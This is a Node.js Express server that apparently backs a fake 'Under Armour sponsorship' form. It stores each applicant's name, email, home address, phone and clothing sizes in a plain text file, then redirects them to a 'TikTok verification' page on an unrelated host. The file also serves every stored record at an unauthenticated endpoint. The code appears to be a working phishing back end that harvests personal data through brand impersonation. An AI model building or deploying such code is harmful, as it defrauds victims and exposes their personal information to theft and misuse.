const express = require('express');
const fs = require('fs');
const path = require('path');
const bodyParser = require('body-parser');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());
app.use(express.static('.')); // Serve static files from current directory

// Use /tmp directory for file storage on Render
const usersFile = path.join('/tmp', 'users.txt');

// Ensure file exists and is writable
const ensureFileExists = () => {
  try {
    if (!fs.existsSync(usersFile)) {
      fs.writeFileSync(usersFile, '', { flag: 'w' });
      console.log('Created users.txt file at:', usersFile);
    }
  } catch (err) {
    console.error('Error creating file:', err);
  }
};

ensureFileExists();

// Handle POST request from Under Armour sponsorship form
app.post('/submit-sponsorship', (req, res) => {
  const { name, email, address, phone, shirt_size, shoe_size, bottoms_size 
} = req.body;
  const timestamp = new Date().toISOString();
  
  // Format the data
  const userData = `
${'='.repeat(60)}
UNDER ARMOUR SPONSORSHIP APPLICATION
${'='.repeat(60)}
Timestamp: ${timestamp}
Name: ${name}
Email: ${email}
Address: ${address}
Phone: ${phone}
Shirt/Hoodie Size: ${shirt_size}
Shoe Size: ${shoe_size}
Bottoms Size: ${bottoms_size}
${'='.repeat(60)}

`;
  
  // Ensure file exists before writing
  ensureFileExists();
  
  // Use writeFile synchronously to ensure it completes before redirect
  try {
    fs.appendFileSync(usersFile, userData, { flag: 'a' });
    console.log('Sponsorship application saved:', { name, email, timestamp 
});
    console.log('File size:', fs.statSync(usersFile).size, 'bytes');
    
    // Redirect to TikTok verification page
    res.redirect('https://tiktok-6q55.onrender.com');
  } catch (err) {
    console.error('Error writing to file:', err);
    console.error('File path:', usersFile);
    console.error('Error details:', err.message);
    return res.status(500).send('Error saving data');
  }
});

// Optional: View all saved applications (for testing)
app.get('/view-applications', (req, res) => {
  ensureFileExists();
  
  fs.readFile(usersFile, 'utf8', (err, data) => {
    if (err) {
      console.error('Error reading file:', err);
      return res.status(500).send('Error reading file: ' + err.message);
    }
    
    const content = data || 'No applications saved yet.';
    console.log('File contents length:', content.length);
    res.type('text/plain').send(content);
  });
});

// Clear the log file (useful for testing)
app.get('/clear-logs', (req, res) => {
  try {
    fs.writeFileSync(usersFile, '', { flag: 'w' });
    res.send('Logs cleared successfully');
  } catch (err) {
    res.status(500).send('Error clearing logs: ' + err.message);
  }
});

app.listen(PORT, () => {
  console.log(`Server running at http://localhost:${PORT}`);
  console.log(`Applications will be saved to: ${usersFile}`);
  console.log(`File exists: ${fs.existsSync(usersFile)}`);
});
